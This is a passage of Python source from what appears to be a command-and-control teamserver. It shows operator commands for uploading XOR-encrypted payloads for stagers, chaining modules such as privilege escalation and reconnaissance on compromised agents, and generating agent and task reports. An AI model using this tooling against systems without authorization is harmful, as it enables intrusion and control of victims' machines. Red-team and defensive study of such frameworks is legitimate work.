  • payload_upload clear            - Clear the currently uploaded payload

DESCRIPTION:
  Upload custom payloads (executables, scripts, etc.) to be used with stagers.
  Supported extensions: .exe, .dll, .py, .js, .vbs, .bat, .ps1, .bin, .dat, .raw

EXAMPLES:
  • payload_upload upload /tmp/myscript.exe
  • payload_upload status
  • payload_upload clear
            """, 'info'

        action = command_parts[1].lower()

        if action == 'upload':
            if len(command_parts) < 3:
                return "Usage: payload_upload upload <local_file_path>", 'error'

            local_file_path = command_parts[2]

            import os
            if not os.path.exists(local_file_path):
                return f" Local file not found: {local_file_path}", 'error'

            if not os.path.isfile(local_file_path):
                return f" Path is not a file: {local_file_path}", 'error'

            # Check file size (max 50MB)
            file_size = os.path.getsize(local_file_path)
            max_size = 50 * 1024 * 1024  # 50MB
            if file_size > max_size:
                return f" File size exceeds maximum allowed size of {max_size // (1024*1024)}MB", 'error'

            if file_size == 0:
                return " File is empty", 'error'

            filename = os.path.basename(local_file_path)

            allowed_extensions = {'.exe', '.dll', '.py', '.js', '.vbs', '.bat', '.ps1', '.bin', '.dat', '.raw', ''}
            file_ext = os.path.splitext(filename)[1].lower() if '.' in filename else ''

            if file_ext not in allowed_extensions:
                return f" File type not allowed. Only executable and script files are permitted: {', '.join(allowed_extensions)}", 'error'

            try:
                with open(local_file_path, 'rb') as f:
                    file_content = f.read()

                if file_ext != '.exe':
                    try:
                        self._validate_file_type(file_content)
                    except Exception as e:
                        return f" File type validation failed: {str(e)}", 'error'

                import os
                secret_key = os.environ.get('SECRET_KEY')
                if not secret_key:
                    return " SECRET_KEY environment variable not configured", 'error'

                if len(secret_key) == 0:
                    return " SECRET_KEY environment variable is empty", 'error'

                from communication.encryption import EncryptionManager
                from core.config import NeoC2Config

                config = NeoC2Config()
                encryption_manager = EncryptionManager(config)

                secret_key_bytes = secret_key.encode('utf-8')

                encrypted_content = encryption_manager.xor_encrypt(file_content, secret_key_bytes)

                encrypted_base64 = base64.b64encode(encrypted_content).decode('utf-8')

                from core.payload_storage import set_uploaded_payload

                if set_uploaded_payload(encrypted_base64, filename):
                    return f" Payload {filename} ({file_size} bytes) uploaded and encrypted successfully!", 'success'
                else:
                    return " Failed to store payload in centralized storage", 'error'

            except Exception as e:
                self.logger.error(f'Payload upload error: {str(e)}')
                return f" Error processing payload: {str(e)}", 'error'

        elif action == 'status':
            try:
                from core.payload_storage import get_uploaded_payload
                payload_data, payload_filename = get_uploaded_payload()

                if payload_data is not None:
                    size = len(payload_data) if payload_data else 0
                    output = f"""
UPLOADED PAYLOAD STATUS:
  Status: Available
  Filename: {payload_filename}
  Size: {size} characters (base64)
  Ready for use with stagers
                    """.strip()
                    return output, 'success'
                else:
                    return "No payload currently uploaded", 'info'

            except Exception as e:
                return f"❌ Error checking payload status: {str(e)}", 'error'

        elif action == 'clear':
            # Clear the currently uploaded payload
            try:
                from core.payload_storage import clear_uploaded_payload
                clear_uploaded_payload()
                return " Uploaded payload cleared", 'success'
            except Exception as e:
                return f" Error clearing payload: {str(e)}", 'error'

        else:
            return f" Unknown action: {action}. Use: upload, status, or clear", 'error'

    def _validate_file_type(self, file_content):
        try:
            import magic
            mime_type = magic.from_buffer(file_content, mime=True)

            allowed_mime_patterns = [
                'application/x-executable',
                'application/x-dosexec',
                'application/x-sharedlib',
                'application/x-mach-binary',
                'application/octet-stream',  # Generic binary
                'text/plain',
                'text/x-python',
                'application/x-python',
                'text/x-script.python',  # Python script
                'text/javascript',
                'application/javascript',
                'text/html',
                'application/x-sh',
                'text/x-shellscript',
            ]

            safe_text_types = [
                'text/',
                'application/javascript',
                'application/json',
            ]

            is_allowed_pattern = any(pattern in mime_type for pattern in allowed_mime_patterns)
            is_safe_text_type = any(mime_type.startswith(safe_pattern) for safe_pattern in safe_text_types)

            if not (is_allowed_pattern or is_safe_text_type):
                raise ValueError(f"File type {mime_type} is not allowed for upload")

        except ImportError:
            pass
        except Exception:
            self.logger.warning("Could not validate file type with python-magic, continuing with upload")
            pass


    def handle_taskchain_command(self, command_parts, session):
        if len(command_parts) < 2:
            return """
TASK CHAIN COMMANDS
═══════════════════════════════════════════════════════════════════

COMMANDS:
  • taskchain create <agent_id> <module1,module2,module3> [name=chain_name] [execute=true]
  • taskchain create <module1,module2,module3> [name=chain_name] [execute=true] (in interactive mode)
  • taskchain list [agent_id=<agent_id>] [status=<status>] [limit=<limit>]
  • taskchain status <chain_id>
  • taskchain execute <chain_id>
  • taskchain help

OPTIONS:
  • name=chain_name    - Name for the task chain
  • execute=true       - Execute the chain immediately after creation (default: false)
  • agent_id=agent_id  - Filter chains by agent ID (for list command)
  • status=status      - Filter chains by status (for list command)
  • limit=limit        - Limit number of results (for list command)

EXAMPLES:
  • taskchain create AGENT001 get_system,whoami,pslist name=priv_escalation
  • taskchain create get_system,whoami,pslist name=priv_escalation (in interactive mode)
  • taskchain create AGENT001 recon_enum,net_scan execute=true
  • taskchain list
  • taskchain list agent_id=AGENT001 status=pending
  • taskchain status CHAIN123
  • taskchain execute CHAIN123
            """, 'info'

        action = command_parts[1].lower()

        try:
            if not hasattr(self, '_task_orchestrator'):
                from teamserver.task_orchestrator import TaskOrchestrator
                self._task_orchestrator = TaskOrchestrator(
                    self.module_manager,
                    self.agent_manager,
                    self.db
                )

            orchestrator = self._task_orchestrator

            if action == 'create':
                if len(command_parts) < 3:
                    return "Usage: taskchain create <agent_id> <module1,module2,module3> [name=chain_name] [execute=true] OR taskchain create <module1,module2,module3> (in interactive mode)", 'error'

                if len(command_parts) == 3 and session.interactive_mode and session.current_agent:
                    # Handle: taskchain create <module1,module2,module3> (in interactive mode)
                    agent_id = session.current_agent
                    modules_str = command_parts[2]
                    command_parts_mod = [command_parts[0], command_parts[1]] + command_parts[2:]  # Update command_parts for option parsing
                elif len(command_parts) >= 4:
                    # Handle: taskchain create <agent_id> <module1,module2,module3> [options...]
                    agent_id = command_parts[2]
                    modules_str = command_parts[3]
                    command_parts_mod = command_parts  # Use original
                else:
                    return "Usage: taskchain create <agent_id> <module1,module2,module3> [name=chain_name] [execute=true] OR taskchain create <module1,module2,module3> (in interactive mode)", 'error'

                options = {}
                for part in command_parts_mod[4 if len(command_parts_mod) > 3 else 3:]:
                    if '=' in part:
                        key, value = part.split('=', 1)
                        options[key.lower()] = value.lower()

                module_names = [name.strip() for name in modules_str.split(',')]
                if not module_names:
                    return "No modules specified for the chain", 'error'

                chain_name = options.get('name')

                execute_now = options.get('execute', 'false').lower() in ['true', '1', 'yes', 'on']

                agent = self.agent_manager.get_agent(agent_id)
                if not agent:
                    return f"Agent {agent_id} not found", 'error'

                if self.agent_manager.is_agent_locked_interactively(agent_id):
                    lock_info = self.agent_manager.get_interactive_lock_info(agent_id)
                    if lock_info and lock_info['operator'] != session.username:
                        return f"Agent {agent_id} is currently in exclusive interactive mode with operator: {lock_info['operator']}. Access denied.", 'error'

                result = orchestrator.create_chain(
                    agent_id=agent_id,
                    module_names=module_names,
                    chain_name=chain_name
                )

                if not result['success']:
                    return f"Failed to create chain: {result['error']}", 'error'

                chain_id = result['chain_id']

                output = f"Task chain '{result['chain_name']}' created successfully\n"
                output += f"Chain ID: {chain_id}\n"
                output += f"Modules: {', '.join(module_names)}\n"

                if execute_now:
                    exec_result = orchestrator.execute_chain(chain_id, execute_async=True)

                    if exec_result['success']:
                        output += f"Chain execution started successfully\n"
                    else:
                        output += f"Chain created but execution failed: {exec_result.get('error', 'Unknown error')}\n"

                return output.strip(), 'success'

            elif action == 'list':
                options = {}
                for part in command_parts[2:]:
                    if '=' in part:
                        key, value = part.split('=', 1)
                        options[key.lower()] = value

                agent_id = options.get('agent_id')
                status = options.get('status')
                
                try:
                    limit = int(options.get('limit', 50))
                    if limit > 100:
                        limit = 100
                except ValueError:
                    limit = 50

                chains = orchestrator.list_chains(agent_id=agent_id, status=status, limit=limit)

                if not chains:
                    return "No task chains found", 'info'

                output = f"Task Chains (limit: {limit}):\n"
                output += "-" * 120 + "\n"
                output += f"{'Chain ID':<20} {'Name':<20} {'Agent ID':<15} {'Status':<12} {'Modules':<25} {'Created':<20}\n"
                output += "-" * 120 + "\n"

                for chain in chains:
                    modules_list = ', '.join(chain['module_names'][:3])  # Show first 3 modules
                    if len(chain['module_names']) > 3:
                        modules_list += '...'

                    created_at = chain['created_at'] if chain['created_at'] else 'N/A'
                    if created_at and len(created_at) > 19:
                        created_at = created_at[:19]  # Truncate to show only datetime part

                    output += f"{chain['chain_id'][:19]:<20} "
                    output += f"{chain['name'][:19]:<20} "
                    output += f"{chain['agent_id'][:14]:<15} "
                    output += f"{chain['status']:<12} "
                    output += f"{modules_list[:24]:<25} "
                    output += f"{created_at:<20}\n"

                output += "-" * 120 + "\n"
                return output, 'success'

            elif action == 'status':
                if len(command_parts) < 3:
                    return "Usage: taskchain status <chain_id>", 'error'

                chain_id = command_parts[2]

                chain_status = orchestrator.get_chain_status(chain_id)

                if not chain_status:
                    return f"Task chain {chain_id} not found", 'error'

                output = f"Chain Details:\n"
                output += "-" * 80 + "\n"
                output += f"Chain ID:   {chain_status['chain_id']}\n"
                output += f"Name:       {chain_status['name']}\n"
                output += f"Agent ID:   {chain_status['agent_id']}\n"
                output += f"Status:     {chain_status['status']}\n"
                output += f"Created:    {chain_status['created_at']}\n"
                output += f"Started:    {chain_status['started_at'] if chain_status['started_at'] else 'N/A'}\n"
                output += f"Completed:  {chain_status['completed_at'] if chain_status['completed_at'] else 'N/A'}\n"
                output += "-" * 80 + "\n"
                output += "Tasks:\n"
                output += "-" * 80 + "\n"

                for task in chain_status['tasks']:
                    output += f"  [{task['sequence_order']}] {task['module_name']} - {task['status']}\n"
                    if task['error']:
                        output += f"      Error: {task['error']}\n"
                    if task['result'] and task['result'].get('output'):
                        output += f"      Result: {task['result']['output'][:100]}{'...' if len(task['result']['output']) > 100 else ''}\n"
                    output += "-" * 80 + "\n"

                return output, 'success'

            elif action == 'execute':
                if len(command_parts) < 3:
                    return "Usage: taskchain execute <chain_id>", 'error'

                chain_id = command_parts[2]

                # Execute the chain
                result = orchestrator.execute_chain(chain_id, execute_async=True)

                if result['success']:
                    return f"Task chain {chain_id} execution started successfully", 'success'
                else:
                    return f"Failed to execute chain {chain_id}: {result.get('error', 'Unknown error')}", 'error'

            elif action == 'help':
                return """
TASK CHAIN COMMANDS
═══════════════════════════════════════════════════════════════════

COMMANDS:
  • taskchain create <agent_id> <module1,module2,module3> [name=chain_name] [execute=true]
  • taskchain list [agent_id=<agent_id>] [status=<status>] [limit=<limit>]
  • taskchain status <chain_id>
  • taskchain execute <chain_id>
  • taskchain help

OPTIONS:
  • name=chain_name    - Name for the task chain
  • execute=true       - Execute the chain immediately after creation (default: false)
  • agent_id=agent_id  - Filter chains by agent ID (for list command)
  • status=status      - Filter chains by status (for list command)
  • limit=limit        - Limit number of results (for list command)

EXAMPLES:
  • taskchain create AGENT001 get_system,whoami,pslist name=priv_escalation
  • taskchain create AGENT001 recon_enum,net_scan execute=true
  • taskchain list
  • taskchain list agent_id=AGENT001 status=pending
  • taskchain status CHAIN123
  • taskchain execute CHAIN123
                """, 'info'

            else:
                return f"Unknown taskchain action: {action}. Use 'taskchain help' for available commands.", 'error'

        except Exception as e:
            import traceback
            self.logger.error(f"Error in taskchain command: {str(e)}")
            self.logger.error(traceback.format_exc())
            return f"Error handling taskchain_command: {str(e)}", 'error'

    def handle_reporting_command(self, command_parts, session):
        """
        Handle reporting commands for generating various reports
        
        Usage:
          reporting list                    - List available reports
          reporting <report_type>           - Generate a specific report
          reporting <report_type> [start_date=YYYY-MM-DD] [end_date=YYYY-MM-DD] [agent_id=AGENT_ID] [user_id=USER_ID]
          reporting export <report_type> <format> [start_date=YYYY-MM-DD] [end_date=YYYY-MM-DD] [agent_id=AGENT_ID] [user_id=USER_ID]
          reporting help                    - Show this help
          
        Report Types:
          agent_activity    - Agent activity and communication report
          task_execution    - Task execution and results report  
          audit_log         - Security audit log with user actions
          module_usage      - Module usage and execution patterns
          system_overview   - System health and configuration report
          
        Export Formats:
          csv, json
        """
        if len(command_parts) < 2:
            return """
REPORTING COMMANDS
═══════════════════════════════════════════════════════════════════

COMMANDS:
  • reporting list
  • reporting <report_type> [start_date=YYYY-MM-DD] [end_date=YYYY-MM-DD] [agent_id=AGENT_ID] [user_id=USER_ID]
  • reporting export <report_type> <format> [start_date=YYYY-MM-DD] [end_date=YYYY-MM-DD] [agent_id=AGENT_ID] [user_id=USER_ID]
  • reporting help

REPORT TYPES:
  • agent_activity    - Agent activity and communication report
  • task_execution    - Task execution and results report
  • audit_log         - Security audit log with user actions
  • module_usage      - Module usage and execution patterns
  • system_overview   - System health and configuration report

EXPORT FORMATS:
  • csv, json

EXAMPLES:
  • reporting list
  • reporting agent_activity
  • reporting task_execution start_date=2024-01-01 end_date=2024-12-31
  • reporting audit_log agent_id=AGENT001
  • reporting export module_usage csv
  • reporting export task_execution json start_date=2024-01-01
            """, 'info'

        action = command_parts[1].lower()

        if action == 'help':
            return """
REPORTING COMMANDS:
  reporting list
  reporting <report_type> [start_date=YYYY-MM-DD] [end_date=YYYY-MM-DD] [agent_id=AGENT_ID] [user_id=USER_ID]
  reporting export <report_type> <format> [start_date=YYYY-MM-DD] [end_date=YYYY-MM-DD] [agent_id=AGENT_ID] [user_id=USER_ID]
  reporting help

REPORT TYPES:
  agent_activity    - Agent activity and communication report
  task_execution    - Task execution and results report
  audit_log         - Security audit log with user actions  
  module_usage      - Module usage and execution patterns
  system_overview   - System health and configuration report

EXPORT FORMATS:
  csv, json

EXAMPLES:
  reporting list
  reporting agent_activity
  reporting task_execution start_date=2024-01-01 end_date=2024-12-31
  reporting audit_log agent_id=AGENT001
  reporting export module_usage csv
  reporting export task_execution json start_date=2024-01-01
            """, 'info'

        if action == 'list':
            reports = [
                {
                    'id': 'agent_activity',
                    'title': 'Agent Activity Report',
                    'description': 'Comprehensive report of agent activity and communication',
                    'categories': ['agents', 'activity']
                },
                {
                    'id': 'task_execution',
                    'title': 'Task Execution Report', 
                    'description': 'Detailed report of task execution and results',
                    'categories': ['tasks', 'execution']
                },
                {
                    'id': 'audit_log',
                    'title': 'Audit Log Report',
                    'description': 'Security audit log with user actions and events',
                    'categories': ['audit', 'security']
                },
                {
                    'id': 'module_usage',
                    'title': 'Module Usage Report',
                    'description': 'Report on modules executed and their usage patterns',
                    'categories': ['modules', 'usage']
                },
                {
                    'id': 'system_overview',
                    'title': 'System Overview Report',
                    'description': 'Comprehensive system health and configuration report',
                    'categories': ['system', 'overview']
                }
            ]

            output = "Available Reports:\n"
            output += "-" * 80 + "\n"
            output += f"{'ID':<20} {'Title':<30} {'Description'}\n"
            output += "-" * 80 + "\n"

            for report in reports:
                output += f"{report['id']:<20} {report['title']:<30} {report['description']}\n"

            output += "-" * 80 + "\n"
            return output, 'success'

        # Handle export command
        if action == 'export':
            if len(command_parts) < 4:
                return "Usage: reporting export <report_type> <format> [options]", 'error'

            report_type = command_parts[2].lower()
            format_type = command_parts[3].lower()

            options = {}
            for part in command_parts[4:]:
                if '=' in part:
                    key, value = part.split('=', 1)
                    options[key.lower()] = value

            try:
                if report_type == 'agent_activity':
                    data = self.get_agent_activity_report(options)
                    result, status = self.format_report_export(data, 'agent_activity', format_type)
                    return result, status
                elif report_type == 'task_execution':
                    data = self.get_task_execution_report(options)
                    result, status = self.format_report_export(data, 'task_execution', format_type)
                    return result, status
                elif report_type == 'audit_log':
                    data = self.get_audit_log_report(options)
                    result, status = self.format_report_export(data, 'audit_log', format_type)
                    return result, status
                elif report_type == 'module_usage':
                    data = self.get_module_usage_report(options)
                    result, status = self.format_report_export(data, 'module_usage', format_type)
                    return result, status
                elif report_type == 'system_overview':
                    data = self.get_system_overview_report()
                    result, status = self.format_report_export(data, 'system_overview', format_type)
                    return result, status
                else:
                    return f"Invalid report type: {report_type}. Available types: agent_activity, task_execution, audit_log, module_usage, system_overview", 'error'
            except Exception as e:
                import traceback
                self.logger.error(f"Error generating report export: {str(e)}")
                self.logger.error(traceback.format_exc())
                return f"Error generating report export: {str(e)}", 'error'

        report_type = action

        options = {}
        for part in command_parts[2:]:
            if '=' in part:
                key, value = part.split('=', 1)
                options[key.lower()] = value

        try:
            if report_type == 'agent_activity':
                data = self.get_agent_activity_report(options)
                result, status = self.format_agent_activity_report(data)
                return result, status
            elif report_type == 'task_execution':
                data = self.get_task_execution_report(options)
                result, status = self.format_task_execution_report(data)
                return result, status
            elif report_type == 'audit_log':
                data = self.get_audit_log_report(options)
                result, status = self.format_audit_log_report(data)
                return result, status
            elif report_type == 'module_usage':
                data = self.get_module_usage_report(options)
                result, status = self.format_module_usage_report(data)
                return result, status
            elif report_type == 'system_overview':
                data = self.get_system_overview_report()
                result, status = self.format_system_overview_report(data)
                return result, status
            else:
                return f"Invalid report type: {report_type}. Use 'reporting list' for available reports.", 'error'

        except Exception as e:
            import traceback
            self.logger.error(f"Error generating report: {str(e)}")
            self.logger.error(traceback.format_exc())
            return f"Error generating report: {str(e)}", 'error'

    def get_agent_activity_report(self, options=None):
        if options is None:
            options = {}
            
        start_date = options.get('start_date')
        end_date = options.get('end_date')
        agent_id = options.get('agent_id')

        # Build query based on filters
        base_query = """
            SELECT
                a.*,
                COALESCE(t.task_count, 0) as task_count,
                COALESCE(t.completed_task_count, 0) as completed_task_count,
                COALESCE(r.result_count, 0) as result_count
            FROM agents a
            LEFT JOIN (
                SELECT
                    agent_id,
                    COUNT(*) as task_count,
                    COUNT(CASE WHEN status = 'completed' THEN 1 END) as completed_task_count
                FROM agent_tasks
                GROUP BY agent_id
            ) t ON a.id = t.agent_id
            LEFT JOIN (
                SELECT
                    agent_id,
                    COUNT(*) as result_count
                FROM agent_tasks
                WHERE result IS NOT NULL AND result != ''
                GROUP BY agent_id
            ) r ON a.id = r.agent_id
        """

        conditions = []
        params = []

        if start_date:
            conditions.append("a.first_seen >= ?")
            params.append(start_date)

        if end_date:
            conditions.append("a.first_seen <= ?")
            params.append(end_date)

        if agent_id:
            conditions.append("a.id = ?")
            params.append(agent_id)

        query = base_query
        if conditions:
            query += " WHERE " + " AND ".join(conditions)

        query += " ORDER BY a.last_seen DESC"

        with self.db.get_cursor() as cursor:
            cursor.execute(query, params)
            agents = []
            for row in cursor.fetchall():
                if row is not None:  # Check if row is not None before converting to dict
                    agents.append(dict(row))

        with self.db.get_cursor() as cursor:
            cursor.execute("SELECT COUNT(*) as count FROM agents")
            row = cursor.fetchone()
            total_agents = row['count'] if row else 0

            cursor.execute("SELECT COUNT(*) as count FROM agents WHERE status = 'active'")
            row = cursor.fetchone()
            active_agents = row['count'] if row else 0

            cursor.execute("SELECT COUNT(*) as count FROM agents WHERE status = 'inactive'")
            row = cursor.fetchone()
            inactive_agents = row['count'] if row else 0

            cursor.execute("SELECT COUNT(*) as count FROM agent_tasks")
            row = cursor.fetchone()
            total_tasks = row['count'] if row else 0

            cursor.execute("SELECT COUNT(*) as count FROM agent_tasks WHERE status = 'completed'")
            row = cursor.fetchone()
            total_completed_tasks = row['count'] if row else 0

        return {
            'summary': {
                'total_agents': total_agents,
                'active_agents': active_agents,
                'inactive_agents': inactive_agents,
                'total_tasks': total_tasks,
                'total_completed_tasks': total_completed_tasks
            },
            'agents': agents
        }

    def get_task_execution_report(self, options=None):
        if options is None:
            options = {}
            
        start_date = options.get('start_date')
        end_date = options.get('end_date')
        agent_id = options.get('agent_id')

        query = """
            SELECT at.*, a.hostname as agent_hostname, a.ip_address as agent_ip
            FROM agent_tasks at
            LEFT JOIN agents a ON at.agent_id = a.id
        """

        conditions = []
        params = []

        if start_date:
            conditions.append("at.created_at >= ?")
            params.append(start_date)

        if end_date:
            conditions.append("at.created_at <= ?")
            params.append(end_date)

        if agent_id:
            conditions.append("at.agent_id = ?")
            params.append(agent_id)

        if conditions:
            query += " WHERE " + " AND ".join(conditions)

        query += " ORDER BY at.created_at DESC"

        with self.db.get_cursor() as cursor:
            cursor.execute(query, params)
            tasks = []
            for row in cursor.fetchall():
                if row is not None:  # Check if row is not None before converting to dict
                    tasks.append(dict(row))

        with self.db.get_cursor() as cursor:
            cursor.execute("SELECT COUNT(*) as count FROM agent_tasks")
            row = cursor.fetchone()
            total_tasks = row['count'] if row else 0

            cursor.execute("SELECT COUNT(*) as count FROM agent_tasks WHERE status = 'completed'")
            row = cursor.fetchone()
            completed_tasks = row['count'] if row else 0

            cursor.execute("SELECT COUNT(*) as count FROM agent_tasks WHERE status = 'pending'")
            row = cursor.fetchone()
            pending_tasks = row['count'] if row else 0

            cursor.execute("SELECT COUNT(*) as count FROM agent_tasks WHERE status = 'failed'")
            row = cursor.fetchone()
            failed_tasks = row['count'] if row else 0

        return {
            'summary': {
                'total_tasks': total_tasks,
                'completed_tasks': completed_tasks,
                'pending_tasks': pending_tasks,
                'failed_tasks': failed_tasks
            },
            'tasks': tasks
        }

    def get_audit_log_report(self, options=None):
        if options is None:
            options = {}
            
        start_date = options.get('start_date')
        end_date = options.get('end_date')
        agent_id = options.get('agent_id')  # Handle agent_id for audit log too (for filtering by agent-related logs)
        user_id = options.get('user_id')

        query = """
            SELECT a.*, u.username as user_username
            FROM audit_log a
            LEFT JOIN users u ON a.user_id = u.id
        """

        conditions = []
        params = []

        if start_date:
            conditions.append("a.timestamp >= ?")
            params.append(start_date)

        if end_date:
            conditions.append("a.timestamp <= ?")
            params.append(end_date)

        if user_id:
            conditions.append("a.user_id = ?")
            params.append(user_id)

        if agent_id:
            conditions.append("(a.resource_id = ? OR a.details LIKE ?)")
            params.append(agent_id)
            params.append(f"%{agent_id}%")

        if conditions:
            query += " WHERE " + " AND ".join(conditions)

        query += " ORDER BY a.timestamp DESC LIMIT 1000"  # Limit for performance

        with self.db.get_cursor() as cursor:
            cursor.execute(query, params)
            logs = []
            for row in cursor.fetchall():
                if row is not None:  # Check if row is not None before converting to dict
                    logs.append(dict(row))

        with self.db.get_cursor() as cursor:
            cursor.execute("SELECT COUNT(*) as count FROM audit_log")
            row = cursor.fetchone()
            total_logs = row['count'] if row else 0

            cursor.execute("SELECT DISTINCT action FROM audit_log")
            unique_actions = len(cursor.fetchall())

        actions = {}
        for log in logs:
            if log:  # Check if log is not None
                action = log.get('action', 'unknown') or 'unknown'
                actions[action] = actions.get(action, 0) + 1

        return {
            'summary': {
                'total_logs': total_logs,
                'unique_actions': unique_actions
            },
            'actions': actions,
            'logs': logs
        }

    def get_module_usage_report(self, options=None):
        if options is None:
            options = {}
            
        start_date = options.get('start_date')
        end_date = options.get('end_date')

        query = """
            SELECT
                m.name as module_name,
                m.description as module_desc,
                m.id as module_id,
                COALESCE(execution_counts.execution_count, 0) as execution_count
            FROM modules m
            LEFT JOIN (
                SELECT
                    m.id as module_id,
                    COUNT(at.id) as execution_count
                FROM modules m
                LEFT JOIN agent_tasks at ON at.command LIKE '%' || m.name || '%'
                WHERE at.id IS NOT NULL
        """

        conditions = []
        params = []

        if start_date:
            conditions.append("at.created_at >= ?")
            params.append(start_date)

        if end_date:
            conditions.append("at.created_at <= ?")
            params.append(end_date)

        if conditions:
            query += " AND " + " AND ".join(conditions)

        query += " GROUP BY m.id"
        query += ") execution_counts ON m.id = execution_counts.module_id"
        query += " ORDER BY execution_count DESC"

        try:
            with self.db.get_cursor() as cursor:
                cursor.execute(query, params)
                modules = []
                for row in cursor.fetchall():
                    if row is not None:  # Check if row is not None before converting to dict
                        modules.append(dict(row))
        except Exception:
            query = """
                SELECT
                    m.name as module_name,
                    m.description as module_desc,
                    m.id as module_id,
                    0 as execution_count
                FROM modules m
                ORDER BY m.name
            """
            with self.db.get_cursor() as cursor:
                cursor.execute(query)
                modules = []
                for row in cursor.fetchall():
                    if row is not None:  # Check if row is not None before converting to dict
                        modules.append(dict(row))

        with self.db.get_cursor() as cursor:
            cursor.execute("SELECT COUNT(*) as count FROM modules")
            row = cursor.fetchone()
            total_modules = row['count'] if row else 0

            cursor.execute("""
                SELECT COUNT(*) as count
                FROM (
                    SELECT 1
                    FROM agent_tasks at
                    JOIN modules m ON at.command LIKE '%' || m.name || '%'
                    LIMIT 1
                )
            """)
            row = cursor.fetchone()
            modules_with_executions = row['count'] if row else 0

        return {
            'summary': {
                'total_modules': total_modules,
                'modules_with_executions': modules_with_executions
            },
            'modules': modules
        }

    def get_system_overview_report(self):
        with self.db.get_cursor() as cursor:
            cursor.execute("SELECT COUNT(*) as count FROM agents")
            row = cursor.fetchone()
            total_agents = row['count'] if row else 0

            cursor.execute("SELECT COUNT(*) as count FROM agents WHERE status = 'active'")
            row = cursor.fetchone()
            active_agents = row['count'] if row else 0

            cursor.execute("SELECT COUNT(*) as count FROM agents WHERE status = 'inactive'")
            row = cursor.fetchone()
            inactive_agents = row['count'] if row else 0

        with self.db.get_cursor() as cursor:
            cursor.execute("SELECT COUNT(*) as count FROM agent_tasks")
            row = cursor.fetchone()
            total_tasks = row['count'] if row else 0

            cursor.execute("SELECT COUNT(*) as count FROM agent_tasks WHERE status = 'completed'")
            row = cursor.fetchone()
            completed_tasks = row['count'] if row else 0

            cursor.execute("SELECT COUNT(*) as count FROM agent_tasks WHERE status = 'pending'")
            row = cursor.fetchone()
            pending_tasks = row['count'] if row else 0

        # Get module statistics
        with self.db.get_cursor() as cursor:
            cursor.execute("SELECT COUNT(*) as count FROM modules")
            row = cursor.fetchone()
            total_modules = row['count'] if row else 0

        with self.db.get_cursor() as cursor:
            cursor.execute("SELECT COUNT(*) as count FROM users")
            row = cursor.fetchone()
            total_users = row['count'] if row else 0

        with self.db.get_cursor() as cursor:
            cursor.execute("SELECT COUNT(*) as count FROM audit_log")
            row = cursor.fetchone()
            total_audit_logs = row['count'] if row else 0

        with self.db.get_cursor() as cursor:
            cursor.execute("SELECT COUNT(*) as count FROM listeners")
            row = cursor.fetchone()
            total_listeners = row['count'] if row else 0

        with self.db.get_cursor() as cursor:
            cursor.execute("SELECT * FROM agents ORDER BY last_seen DESC LIMIT 5")
            recent_agents = []
            for row in cursor.fetchall():
                if row is not None:  # Check if row is not None before converting to dict
                    recent_agents.append(dict(row))

            cursor.execute("SELECT * FROM agent_tasks ORDER BY created_at DESC LIMIT 5")
            recent_tasks = []
            for row in cursor.fetchall():
                if row is not None:  # Check if row is not None before converting to dict
                    recent_tasks.append(dict(row))

        return {
            'system_stats': {
                'total_agents': total_agents,
                'active_agents': active_agents,
                'inactive_agents': inactive_agents,
                'total_tasks': total_tasks,
                'completed_tasks': completed_tasks,
                'pending_tasks': pending_tasks,
                'total_modules': total_modules,
                'total_users': total_users,
                'total_audit_logs': total_audit_logs,
                'total_listeners': total_listeners
            },
            'recent_agents': recent_agents,
            'recent_tasks': recent_tasks,
            'generated_at': datetime.now().isoformat()
        }

    def format_agent_activity_report(self, data):
        output = "AGENT ACTIVITY REPORT\n"
        output += "=" * 80 + "\n"
        
        summary = data.get('summary', {}) or {}
        output += f"SUMMARY:\n"
        output += f"  Total Agents:           {summary.get('total_agents', 0)}\n"
        output += f"  Active Agents:          {summary.get('active_agents', 0)}\n"
        output += f"  Inactive Agents:        {summary.get('inactive_agents', 0)}\n"
        output += f"  Total Tasks:            {summary.get('total_tasks', 0)}\n"
        output += f"  Total Completed Tasks:  {summary.get('total_completed_tasks', 0)}\n"
        output += "\n"
        
        agents = data.get('agents', []) or []
        if agents:
            output += f"AGENT DETAILS:\n"
            output += f"  {'ID':<12} {'IP Address':<15} {'Hostname':<20} {'Status':<10} {'Tasks':<8} {'Results':<8}\n"
            output += f"  {'-'*12} {'-'*15} {'-'*20} {'-'*10} {'-'*8} {'-'*8}\n"
            
            for agent in agents:
                if agent is not None:
                    agent_id = str(agent.get('id', ''))[:10] if agent.get('id') is not None else ''
                    ip_address = str(agent.get('ip_address', ''))[:15] if agent.get('ip_address') is not None else ''
                    hostname = str(agent.get('hostname', ''))[:20] if agent.get('hostname') is not None else ''
                    status = str(agent.get('status', ''))[:10] if agent.get('status') is not None else ''
                    task_count = str(agent.get('task_count', 0)) if agent.get('task_count') is not None else '0'
                    result_count = str(agent.get('result_count', 0)) if agent.get('result_count') is not None else '0'
                    output += f"  {agent_id:<12} {ip_address:<15} {hostname:<20} {status:<10} {task_count:<8} {result_count:<8}\n"
                else:
                    output += f"  Invalid agent data found\n"
        else:
            output += "  No agents found for the specified criteria.\n"
            
        return output, 'success'

    def format_task_execution_report(self, data):
        output = "TASK EXECUTION REPORT\n"
        output += "=" * 80 + "\n"
        
        # Summary
        summary = data.get('summary', {}) or {}
        output += f"SUMMARY:\n"
        output += f"  Total Tasks:        {summary.get('total_tasks', 0)}\n"
        output += f"  Completed Tasks:    {summary.get('completed_tasks', 0)}\n"
        output += f"  Pending Tasks:      {summary.get('pending_tasks', 0)}\n"
        output += f"  Failed Tasks:       {summary.get('failed_tasks', 0)}\n"
        output += "\n"
        
        # Task details
        tasks = data.get('tasks', []) or []
        if tasks:
            output += f"TASK DETAILS:\n"
            output += f"  {'Task ID':<10} {'Agent ID':<12} {'Status':<12} {'Command':<20}\n"
            output += f"  {'-'*10} {'-'*12} {'-'*12} {'-'*20}\n"
            
            for task in tasks[:20]:  # Limit to first 20 for readability
                if task is not None:
                    task_id = str(task.get('id', ''))[:10] if task.get('id') is not None else ''
                    agent_id = str(task.get('agent_id', ''))[:12] if task.get('agent_id') is not None else ''
                    status = str(task.get('status', ''))[:12] if task.get('status') is not None else ''
                    command = str(task.get('command', ''))[:20] if task.get('command') is not None else 'N/A'  # Truncate command
                    output += f"  {task_id:<10} {agent_id:<12} {status:<12} {command:<20}\n"
                else:
                    output += f"  Invalid task data found\n"
            
            if len(tasks) > 20:
                output += f"  ... and {len(tasks) - 20} more tasks\n"
        else:
            output += "  No tasks found for the specified criteria.\n"
            
        return output, 'success'

    def format_audit_log_report(self, data):
